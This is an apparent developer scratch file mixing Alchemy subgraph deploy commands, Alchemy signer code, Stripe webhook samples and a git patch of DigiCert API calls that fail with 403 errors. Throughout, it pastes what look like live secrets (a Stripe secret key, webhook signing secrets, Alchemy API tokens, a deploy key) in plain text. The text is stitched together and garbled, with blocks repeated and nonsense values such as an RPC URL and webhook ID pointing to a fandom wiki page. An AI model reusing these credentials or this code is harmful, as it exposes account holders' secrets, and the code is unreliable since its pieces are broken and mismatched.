          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz

  curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<Stripe_Men In Black agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz

import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
  Alchemy Webhook signing key whsec_Ka3G2XkXDVxzhdrFzG8n2OFq

Alchemy api key 2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby

Auth token alchemy webhooks jE92Hk8uCBZnJEh1PP0PoUVDwnuYFdVp
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.Invoice.modify(
  "id",
  auto_advance=False,
)

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")

client.invoices.update(
  "id",
  {"auto_advance": False},
)

brew install stripe/stripe-cli/stripe
stripe login
Your pairing code is: enjoy-enough-outwit-win
This pairing code verifies your authentication with Stripe.
Press Enter to open the browser or visit https://dashboard.stripe.com/stripecli/confirm_auth?t=THQdJfL3x12udFkNorJL8OF1iFlN8Az1 (^C to quit)
stripe login --interactive
stripe login --api-key sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq

$  stripe listen --forward-to localhost:4242/stripe_webhooks

$  stripe listen --events payment_intent.created,customer.created,payment_intent.succeeded,checkout.session.completed,payment_intent.payment_failed \
  --forward-to localhost:4242/webhook
stripe listen --load-from-webhooks-api --forward-to localhost:5000
Ready! Your webhook signing secret is '{{whsec_dc0d1e55ff9884fa12920805cb72f473b613c1fc28d4465c8615748ec8819d1c}}' (^C to quit)
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
stripe.api_key = 'sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq'

from django.http import HttpResponse

# If you are testing your webhook locally with the Stripe CLI you
# can find the endpoint's secret by running `stripe listen`
# Otherwise, find your endpoint's secret in your webhook settings in the Developer Dashboard
endpoint_secret = 'whsec_...'

# Using Django
@csrf_exempt
def my_webhook_view(request):
  payload = request.body
  sig_header = request.META['t=1492774577,
v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd,
v0=6ffbb59b2300aae63f272406069a9788598b792a944a07aba816edb039']
  event = None

  try:
    event = stripe.Webhook.construct_event(
      payload, sig_header, endpoint_secret
    )
  except ValueError as e:
    # Invalid payload
    print('Error parsing payload: {}'.format(str(e)))
    return HttpResponse(status=400)
  except stripe.error.SignatureVerificationError as e:
    # Invalid signature
    print('Error verifying webhook signature: {}'.format(str(e)))
    return HttpResponse(status=400)

  # Handle the event
  if event.type == 'payment_intent.succeeded':
    payment_intent = event.data.object # contains a stripe.PaymentIntent
    print('PaymentIntent was successful!')
  elif event.type == 'payment_method.attached':
    payment_method = event.data.object # contains a stripe.PaymentMethod
    print('PaymentMethod was attached to a Customer!')
  # ... handle other event types
  else:
    print('Unhandled event type {}'.format(event.type))

  return HttpResponse(status=200)
stripe trigger payment_intent.succeeded
Running fixture for: payment_intent
Trigger succeeded! Check dashboard for event details.
Note
https://<your-website>/<your-webhook-endpoint>
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
stripe.api_key = 'sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq'

endpoint = stripe.WebhookEndpoint.create(
  url='https://example.com/my/webhook/endpoint',
  enabled_events=[
    'payment_intent.payment_failed',
    'payment_intent.succeeded',
  ],
)

// server.js
//
// Use this sample code to handle webhook events in your integration.
//
// 1) Paste this code into a new file (server.js)
//
// 2) Install dependencies
//   npm install stripe
//   npm install express
//
// 3) Run the server on http://localhost:4242
//   node server.js

// The library needs to be configured with your account's secret key.
// Ensure the key is kept out of any version control system you might be using.
const stripe = require('stripe')('sk_test_...');
const express = require('express');
const app = express();

// This is your Stripe CLI webhook secret for testing your endpoint locally.
const endpointSecret = "whsec_dc0d1e55ff9884fa12920805cb72f473b613c1fc28d4465c8615748ec8819d1c";

app.post('/webhook', express.raw({type: 'application/json'}), (request, response) => {
  const sig = request.headers['stripe-signature'];

  let event;

  try {
    event = stripe.webhooks.constructEvent(request.body, sig, endpointSecret);
  } catch (err) {
    response.status(400).send(`Webhook Error: ${err.message}`);
    return;
  }

  // Handle the event
  switch (event.type) {
    case 'payment_intent.succeeded':
      const paymentIntentSucceeded = event.data.object;
      // Then define and call a function to handle the event payment_intent.succeeded
      break;
    // ... handle other event types
    default:
      console.log(`Unhandled event type ${event.type}`);
  }

  // Return a 200 response to acknowledge receipt of the event
  response.send();
});

app.listen(4242, () => console.log('Running on port 4242'));

stripe login

stripe listen --forward-to localhost:4242/webhook

stripe trigger payment_intent.succeeded

git checkout Grateful-Bieszczat/webhook-data-created-online-with-bitbuck-1710404806443

git checkout main

From d0d2612716002cf07590f7a35fbf5b4680a109a1 Mon Sep 17 00:00:00 2001
From: grateful345 <163609752+grateful345@users.noreply.github.com>
Date: Fri, 15 Mar 2024 23:54:34 -0500
Subject: [PATCH] Update README.md
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Account id degi cert 90171939-7ae7-4884-85d4-9a5ccc670fa6
Account id organizations
979310f6-db24-4c67-bcb9-6926d92cd6ec

User id
fa5e727c-0527-44e0-9004-5fdc347b0b3f

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec
Server response
Code	Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:52:19 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 10
 x-frame-options: same-origin
 x-iinfo: 15-83073046-83073052 NNNN CT(36 39 0) RT(1710564738237 37) q(0 0 1 -1) r(2 2) U11
 x-xss-protection: 1; mode=block
Responses
Code	Description	Links
200
Organization list

Media type

Controls Accept header.
Example Value
Schema
[
  {
    "id": "d9674d8f-7ad6-4280-89b5-136c2aded288",
    "name": "DigiCert Inc.",
    "address": "2801 N Thanksgiving Way",
    "address2": "Suite 500",
    "zip_code": 84043,
    "city": "Lehi",
    "state": "Utah",
    "country": "US",
    "phone": "+1 (123) 456-7890",
    "account": {
      "id": "ff94b6dc-d360-4245-9918-0d0cf7ac347a",
      "name": "Example Account"
    },
    "active": true
  }
]

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 1000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6

{
  "id": "ad65390a-0380-4522-bab6-f007c447757a",
  "name": "Example account 1",
  "active": true,
  "service_period": {
    "from": "2021-05-26",
    "to": "2022-05-26"
  },
  "friendly_identifier": "7092363",
  "admins": [
    {
      "id": "f7e866c9-768c-4442-adc9-abe2ba4b69d1",
      "name": "Jane Doe",
      "email": "jane.doe@example.com"
    }
  ],
  "sign_in_methods": [
    {
      "signInMethod": "standard",
      "status": "enabled",
      "mfaStatus": "disabled",
      "clientAuthCertLoginEnabled": false
    }
  ],
  "oauth_clients": [],
  "locale": "en_US"
}
No links

GET

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:40:43 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 6
 x-frame-options: same-origin
 x-iinfo: 12-53698010-53698015 NNNY CT(35 38 0) RT(1710564042696 63) q(0 0 0 -1) r(1 1) U11
 x-xss-protection: 1; mode=block

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account?active=all&name=6309304695' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account?active=all&name=6309304695
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:42:23 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 6
 x-frame-options: same-origin
 x-iinfo: 7-14411267-14411269 NNNY CT(36 40 0) RT(1710564142411 41) q(0 0 0 -1) r(1 1) U11
 x-xss-protection: 1; mode=block
Responses
Code Description Links
200
List of accounts

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "id": "50580ac7-60e4-4df2-a834-d12c1ab79afb",
    "name": "Example account 1",
    "active": true,
    "service_period": {
      "from": "2021-05-25",
      "to": "2022-05-25"
    },
    "friendly_identifier": "5258283",
    "admins": [
      {
        "id": "833e4906-fc45-4bd3-841e-40506c0e8ca8",
        "email": "api_service_user_1@example.com"
      },
      {
        "id": "fa8285c7-5e35-4ea8-8cc4-dc95f7dc3cd6",
        "email": "api_service_user_2@example.com"
      },
      {
        "id": "7d78b46a-c635-4bda-8b6d-13802046a963",
        "name": "John Doe",
        "email": "account_user_1@example.com"
      }
    ],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  },
  {
    "id": "be5ffbd2-1a50-4675-912f-2fe015812f87",
    "name": "Example account 2",
    "active": true,
    "service_period": {
      "from": "2021-05-26",
      "to": "2022-05-26"
    },
    "friendly_identifier": "7092363",
    "admins": [],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:44:01 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 5
 x-frame-options: same-origin
 x-iinfo: 15-83048556-83048560 NNNY CT(36 38 0) RT(1710564241016 44) q(0 0 0 -1) r(1 1) U11
 x-xss-protection: 1; mode=block
Responses
Code Description Links
200
Success

Media type

Controls Accept header.
Example Value
Schema
[
  {
    "id": "7b5d83e7-6e5f-4ade-ad48-111c6f3420f7",
    "user_id": "e7ea1214-d688-48ba-aa1b-131fb2867ac5",
    "name": "API token name",
    "end_date": "2022-05-30T23:59:59Z",
    "start_date": "2021-06-25T21:20:06Z",
    "active": true,
    "enabled": true,
    "masked_api_key": "*************9e2a1"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/locales' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/locales
Server response
Code	Details
200
Response body
Download
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"
  },
  {
    "code": "it_IT",
    "language": "Italiano"
  },
  {
    "code": "ja_JP",
    "language": "日本語"
  },
  {
    "code": "ko_KR",
    "language": "한국어"
  },
  {
    "code": "nl_NL",
    "language": "Nederlands"
  },
  {
    "code": "pt_BR",
    "language": "Português"
  },
  {
    "code": "ru_RU",
    "language": "Русский"
  },
  {
    "code": "zh_CN",
    "language": "简体中文"
  },
  {
    "code": "zh_TW",
    "language": "繁體中文"
  }
]
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:50:15 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 7
 x-frame-options: same-origin
 x-iinfo: 18-118172517-118172518 NNNN CT(35 39 0) RT(1710564614160 42) q(0 0 0 -1) r(1 1) U2
 x-xss-protection: 1; mode=block
Responses
Code	Description	Links
200
Locales list

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"

Signed-off-by: grateful345 <163609752+grateful345@users.noreply.github.com>
---
 README.md | 450 ++++++++++++++++++++++++++++++++++++++++++++++++++++++
 1 file changed, 450 insertions(+)

diff --git a/README.md b/README.md
index ed006df..5d8683a 100644
--- a/README.md
+++ b/README.md
@@ -1,3 +1,453 @@
+
+$ Account id degi cert 90171939-7ae7-4884-85d4-9a5ccc670fa6
+Account id organizations 
+979310f6-db24-4c67-bcb9-6926d92cd6ec
+
+User id 
+fa5e727c-0527-44e0-9004-5fdc347b0b3f
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec
+Server response
+Code	Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:52:19 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 10 
+ x-frame-options: same-origin 
+ x-iinfo: 15-83073046-83073052 NNNN CT(36 39 0) RT(1710564738237 37) q(0 0 1 -1) r(2 2) U11 
+ x-xss-protection: 1; mode=block 
+Responses
+Code	Description	Links
+200	
+Organization list
+
+Media type
+
+Controls Accept header.
+Example Value
+Schema
+[
+  {
+    "id": "d9674d8f-7ad6-4280-89b5-136c2aded288",
+    "name": "DigiCert Inc.",
+    "address": "2801 N Thanksgiving Way",
+    "address2": "Suite 500",
+    "zip_code": 84043,
+    "city": "Lehi",
+    "state": "Utah",
+    "country": "US",
+    "phone": "+1 (123) 456-7890",
+    "account": {
+      "id": "ff94b6dc-d360-4245-9918-0d0cf7ac347a",
+      "name": "Example Account"
+    },
+    "active": true
+  }
+]
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 1000'
+Request URL
+https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
+
+{
+  "id": "ad65390a-0380-4522-bab6-f007c447757a",
+  "name": "Example account 1",
+  "active": true,
+  "service_period": {
+    "from": "2021-05-26",
+    "to": "2022-05-26"
+  },
+  "friendly_identifier": "7092363",
+  "admins": [
+    {
+      "id": "f7e866c9-768c-4442-adc9-abe2ba4b69d1",
+      "name": "Jane Doe",
+      "email": "jane.doe@example.com"
+    }
+  ],
+  "sign_in_methods": [
+    {
+      "signInMethod": "standard",
+      "status": "enabled",
+      "mfaStatus": "disabled",
+      "clientAuthCertLoginEnabled": false
+    }
+  ],
+  "oauth_clients": [],
+  "locale": "en_US"
+}
+No links
+
+GET
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
+Server response
+Code Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:40:43 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
